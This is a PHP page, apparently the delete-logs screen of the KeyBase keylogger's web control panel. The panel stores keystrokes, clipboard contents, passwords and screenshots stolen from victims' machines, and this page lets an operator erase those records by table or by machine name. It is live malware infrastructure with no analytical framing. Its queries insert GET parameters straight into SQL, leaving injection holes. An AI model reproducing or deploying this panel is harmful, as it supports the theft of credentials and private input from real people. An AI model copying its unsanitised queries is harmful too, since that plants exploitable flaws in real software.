<?php
ob_start();
session_start();
include('config.php');
if (!isset($_SESSION['logged_in']) 
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>KeyBase Web Panel</title>
	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
     <!-- MORRIS CHART STYLES-->
    <link href="assets/js/morris/morris-0.4.3.min.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
</head>
<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="index.php">KeyBase</a> 
            </div>
  <div style="color: white;
padding: 15px 50px 5px 50px;
float: right;
font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">Logout</a> </div>
        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                    <li>
                        <a  href="index.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard</a>
                    </li>
                     <li>
                        <a  href="keystrokes.php"><i class="fa fa-desktop fa-3x"></i> Keystrokes</a>
                    </li>
                    <li>
                        <a  href="screenshots.php"><i class="fa fa-qrcode fa-3x"></i> Screenshots</a>
                    </li>
						   <li  >
                        <a   href="clipboard.php"><i class="fa fa-bar-chart-o fa-3x"></i> Clipboard</a>
                    </li>	
                      <li  >
                        <a  href="passwords.php"><i class="fa fa-table fa-3x"></i> Passwords</a>
                    </li>
                    <li  >
                        <a class="active-menu"  href="delete.php"><i class="fa fa-qrcode fa-3x"></i> Delete Logs</a>
                    </li>
					                   
                    
                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">
                     <h2>Delete Logs</h2>   
                        <h5>This action cannot be undone. </h5>
                    </div>
                </div>              
                 <!-- /. ROW  -->
                  <hr />
                <div class="row">
                <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
               <center><a href= "?deletetype=by_table&tablename=Notifications"><button type="button" class="btn btn-info btn-circle"><i class="fa fa-check"></i>
				   </button></a></center>
                <div class="text-box" >
					<center><p class="text-muted">Delete All Notifications</p></center>

                </div>
             </div>
		     </div>
                    <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <center><a href= "?deletetype=by_table&tablename=Keystrokes"><button type="button" class="btn btn-success btn-circle"><i class="fa fa-list"></i>
				   </button></a></center>
                <div class="text-box" >
					<center><p class="text-muted">Delete All Keystrokes</p></center>
                </div>
             </div>
		     </div>
                    <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <center><a href= "?deletetype=by_table&tablename=Passwords"><button type="button" class="btn btn-warning btn-circle"><i class="fa fa-link"></i>
				   </button></a></center>
                <div class="text-box" >
					<center><p class="text-muted">Delete All Passwords </p></center>
                </div>
             </div>
		     </div>
                    <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <center><a href= "?deletetype=by_table&tablename=Clipboard"><button type="button" class="btn btn-primary btn-circle"><i class="fa fa-money"></i>
					</button></a></center>
                <div class="text-box" >
                                        <center><p class="text-muted">Delete All Clipboards </p></center>
                </div>
             </div>
<?php
if(isset($_GET['deletetype'])) 
{
	$conn = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database);
	$tablename = $_GET['tablename'];
	if($_GET['deletetype'] == 'by_table')
	{
		$sqlquery = "TRUNCATE TABLE ".$tablename."";
	}
	if ($conn->query($sqlquery) === TRUE) {
		
		echo "<div class='alert alert-info alert-dismissable'> All records are successfully deleted from ".$tablename." </div>";
	} else {
		echo "<div class='alert alert-info alert-dismissable'> Error deleting records: ".$conn->error." </div>";
	}
	$conn->close();
}
?>
						
		     </div>
</div>
<div class="row">
                <div class="col-md-12">
                
                    <div class="panel panel-default">
                        <div class="panel-heading">
                           Delete Logs received from Specific Computers
                        </div>
                        <div class="panel-body">
							 
								<div class="panel panel-back noti-box">
								<div class="input-group">
									<!--<div class="alert alert-info alert-dismissable">
                                Note: This will delete logs from all tables for a particular machine name. Check for duplicate names before deleting one machine.
									</div> --->
                                <form method="get" name="machinename" id="machinename" action="delete.php">
									<input id="btn-input" name ="machinename" type="text" class="form-control input-sm" placeholder="Machine Name">
                                <span class="input-group-btn">
                                    	<button class="btn btn-warning btn-sm" id="btn-chat">
                                        Delete Now
										</button> 
			                    </span>
									</form>
                           		</div>
									<hr />
									<?php
if(isset($_GET['machinename']) && !empty($_GET['machinename']))
		{
			$conn = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database);
			$machine_name = $_GET['machinename'];
			$Noti_query = "DELETE FROM Notifications WHERE machinename = '".$machine_name."'";
			$Keys_query = "DELETE FROM Keystrokes WHERE machinename = '".$machine_name."'";
			$Pass_query = "DELETE FROM Passwords WHERE machinename = '".$machine_name."'";
			$Clip_query = "DELETE FROM Clipboard WHERE machinename = '".$machine_name."'";
			if($conn->query($Noti_query) === TRUE && $conn->query($Keys_query) === TRUE && $conn->query($Pass_query) === TRUE && 				$conn->query($Clip_query) === TRUE){
				echo "<div class='alert alert-info alert-dismissable'> All records are successfully deleted for ".$machine_name." </div>";
		}
		else{
			echo "<div class='alert alert-info alert-dismissable'> Error deleting records: " .$conn->error. "</div>";
		}
}
?>


							</div>

						</div>

					</div>
						<a href= "?screenshots=all">	<span class="input-group-btn">
                                    	<button name="screenshots" class="btn btn-warning btn-sm" id="btn-chat">
                                        Delete All Screenshots
										</button> 
			                    </span></a>
									
<?php
if(isset($_GET['screenshots']) && !empty($_GET['screenshots']))
{
 	$images = glob("image/Images/*.jpg");
	foreach($images as $image){
     	@unlink($image);
	}
	$images = glob("image/Images/*.png");
	foreach($images as $image){
     	@unlink($image);
	}
	$thumbs = glob("image/Images/thumbs/*.*");
	foreach($thumbs as $image){
     	@unlink($image);
	}
		echo "<div class='alert alert-info alert-dismissable'> All screenshots are successfully deleted</div>";
	}
?>
	</div>
				</div>
			</div>
		</div>
		
             <!-- /. PAGE INNER  -->
            </div>
	
         <!-- /. PAGE WRAPPER  -->
        
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
     <!-- MORRIS CHART SCRIPTS -->
     <script src="assets/js/morris/raphael-2.1.0.min.js"></script>
    <script src="assets/js/morris/morris.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
     
   
</body>
</html>